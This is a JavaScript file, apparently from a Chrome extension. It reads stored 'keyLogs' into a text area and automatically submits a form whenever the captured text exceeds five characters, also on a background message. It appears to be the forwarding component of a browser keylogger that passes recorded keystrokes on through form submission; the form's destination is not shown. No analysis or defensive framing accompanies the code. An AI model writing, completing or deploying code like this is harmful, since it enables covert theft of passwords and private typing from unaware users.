document.addEventListener('DOMContentLoaded', () => {
    const logArea = document.getElementById('inputBox');
    const form = document.querySelector('form');
    const clearButton = document.getElementById('clearButton');
    const sendButton = document.getElementById('send');

    // Loads the logs from storage into the textarea.
    function loadLogs() {
        chrome.storage.local.get(['keyLogs'], (result) => {
            logArea.value = result.keyLogs || '';
        });
    }

    // Clears the logs from both the textarea and storage.
    function clearLogs() {
        logArea.value = '';
        chrome.runtime.sendMessage({ type: 'clearLogs' });
    }

    // Checks the length of the logs and submits the form if necessary.
    function handleAutoSubmit() {
        if (logArea.value.length > 5) {
            console.log(logArea.value.length);
            form.submit();
        }
    }

    // Handles the input event for the input box and clears it if the length exceeds 5 characters.
    function handleInputChange() {
        if (logArea.value.length > 5) {
            form.submit();
            console.log(logArea.value);
            logArea.value = ''; // Clear the input box
        }
    }

    loadLogs();
    clearButton.addEventListener('click', clearLogs);
    logArea.addEventListener('input', handleInputChange);

    chrome.runtime.onMessage.addListener((message) => {
        if (message.type === 'autoSubmit') {
            form.submit();
        }
    });

    handleAutoSubmit();
});
